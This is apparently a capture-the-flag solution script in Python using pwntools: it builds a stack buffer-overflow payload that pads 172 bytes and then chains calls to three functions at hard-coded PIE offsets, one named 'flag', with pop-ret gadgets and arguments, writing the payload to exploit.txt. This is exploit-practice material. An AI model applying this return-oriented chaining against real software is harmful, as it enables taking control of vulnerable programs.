import pwn

pie_random = 0  # with aslr on this number should be bruteforced
base_addr = 0x565561d9 - 0x11d9  # in my case the base addr is that
pie_addr = base_addr + pie_random

poppopret = pwn.pack(0x13ba + pie_addr)
poppoppopret = pwn.pack(0x13b9 + pie_addr)

f1 = pwn.pack(0x11d9 + pie_addr)
f1arg1 = pwn.pack(0x9c)
f1arg2 = pwn.pack(0x12c)

f2 = pwn.pack(0x121d + pie_addr)
f2arg1 = pwn.pack(0x0)
f2arg2 = pwn.pack(0xd)
f2arg3 = pwn.pack(0xd)

flag = pwn.pack(0x1273 + pie_addr)
f3arg1 = pwn.pack(0x2)

buff = 'A' * 172

payload = buff + \
    f1 + poppopret + \
    f1arg1 + f1arg2 + \
    f2 + poppoppopret + \
    f2arg1 + f2arg2 + f2arg3 + \
    flag + 'JUNK' + \
    f3arg1

open('exploit.txt', 'w').write(payload)
print(payload)
